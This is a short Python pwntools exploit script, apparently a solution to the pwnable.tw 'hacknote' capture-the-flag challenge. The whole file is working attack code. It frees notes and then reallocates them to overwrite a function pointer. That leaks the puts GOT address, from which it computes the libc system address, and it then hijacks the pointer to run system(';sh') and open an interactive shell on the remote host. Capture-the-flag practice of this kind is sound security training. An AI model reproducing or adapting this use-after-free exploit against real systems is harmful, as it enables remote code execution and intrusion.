from pwn import *

r = remote('chall.pwnable.tw', 10102)
#r = remote('localhost', 10139)

print_note_fun = 0x804862b
puts_got = 0x804a024

def add_note(size, content):
    r.recvuntil(":")
    r.sendline("1")
    r.recvuntil(":")
    r.sendline(str(size))
    r.recvuntil(":")
    r.sendline(content)
def del_note(idx):
    r.recvuntil(":")
    r.sendline("2")
    r.recvuntil(":")
    r.sendline(str(idx))

def print_note(idx):
    r.recvuntil(":")
    r.sendline("3")
    r.recvuntil(":")
    r.sendline(str(idx))

add_note(0x25, "dada")
add_note(0x25, "dada")
del_note(0)
del_note(1)
add_note(8, p32(print_note_fun) + p32(puts_got))
print_note(0)

r.recvuntil(":")
tmp = r.recvline()

addr = u32(tmp[0:4].ljust(4,"\x00"))
print hex(addr)

base = addr - 0x5f140
system = base + 0x3a940

del_note(2)

add_note(8, p32(system) + ";sh")
print_note(0)

r.interactive()
